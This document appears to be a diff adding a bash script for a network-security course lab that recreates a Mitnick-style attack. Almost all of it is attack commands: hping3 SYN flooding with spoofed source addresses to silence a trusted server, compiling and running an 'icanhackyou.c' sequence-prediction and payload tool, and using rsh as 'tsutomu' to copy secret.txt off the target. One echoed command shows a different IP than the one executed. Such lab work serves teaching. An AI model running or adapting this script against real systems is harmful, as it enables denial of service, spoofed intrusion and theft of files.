@@ -1,0 +1,23 @@
+#!/bin/bash
+echo "Welcome to the assignment 2 of CNS
+We will first start with the hping3 command to do SYN flooding.
+
+The command is: hping3 -S -V 172.16.18.4 -p 513 -a 192.168.1.1 -d 7 -e 'disable' -c 10"
+sleep 3
+sudo hping3 -S -V 172.16.18.4 -p 513 -a 192.168.1.1 -d 7 -e "disable" -c 10
+echo "Server is down, I repeat server is down. Now compilling and running the script for predicting SYN and sending payload"
+sleep 3
+sudo gcc icanhackyou.c -lnet -lpcap
+sudo ./a.out eth0
+sleep 3
+echo " Now we will copy the content of secret.txt file to our local file called secret.txt"
+rsh 172.16.18.5 -l tsutomu cat secret.txt >> secret.txt
+sleep 2
+echo "Before enabling the server check the content of the file is:::::::::: "
+sleep 2
+cat secret.txt
+sleep 4
+echo "Now we need to enable the server. The command is  hping3 -S -V 172.16.1.1 -p 513 -a 192.168.1.1 -d 6 -e 'enable' -c 1"
+sleep 2
+sudo hping3 -S -V 172.16.18.4 -p 513 -a 192.168.1.1 -d 6 -e "enable" -c 1
+echo "Shell script done!"
